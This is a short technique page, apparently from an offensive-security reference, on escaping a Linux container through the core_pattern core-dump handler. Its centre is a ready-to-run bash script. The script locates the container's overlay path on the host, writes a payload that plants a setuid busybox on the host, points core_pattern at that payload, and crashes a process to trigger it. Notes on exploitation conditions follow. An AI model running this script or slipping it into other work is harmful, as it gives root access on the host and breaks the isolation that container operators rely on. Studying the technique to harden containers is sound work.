---
title: "core_pattern: host code execution through the core dump handler"
description: "Escaping a container by writing /proc/sys/kernel/core_pattern with a pipe handler, so that when any process dumps core the kernel executes the attacker's program in the host namespace as root."
keywords:
  - core_pattern
  - core dump handler
  - container escape
  - procfs escape
  - CAP_SYS_ADMIN
---

# core_pattern

`/proc/sys/kernel/core_pattern` controls what happens when a process dumps core. If its value starts with a pipe, the kernel runs that program and feeds it the core, and it runs in the **host's** namespaces as root. A container that can write this file (host `/proc` mounted writable, or `CAP_SYS_ADMIN` in the initial user namespace) escapes by pointing it at a helper on a host-visible path, then crashing a process to fire it.

```bash
# core_pattern runs in the host mount namespace; the helper must be on a host-visible path.
# Find the container rootfs on the host via the overlay upperdir, then drop the helper there.
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

cat > /payload <<'SH'
#!/bin/sh
cp /bin/busybox /host_marker && chmod +s /host_marker
SH
chmod +x /payload

echo "|$host_path/payload" > /proc/sys/kernel/core_pattern

# Trigger a core dump in any process to run the handler on the host
tail -f /dev/null & sleep 1; kill -SIGSEGV %1
```

## Exploitation notes

- The pipe handler always executes in the initial namespaces, which is exactly why it crosses the container boundary; the only real constraint is making the helper path resolve in the host filesystem.
- Writability is the gate: a privileged container (or one with `CAP_SYS_ADMIN` and an unmasked `/proc/sys`) can write it; an unprivileged container with a read-only `/proc` cannot.
- Closely related knobs in this directory behave the same way: see [modprobe path](modprobe-path.md) and [uevent_helper](uevent-helper.md).

## References

- [man 5 core](https://man7.org/linux/man-pages/man5/core.5.html)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
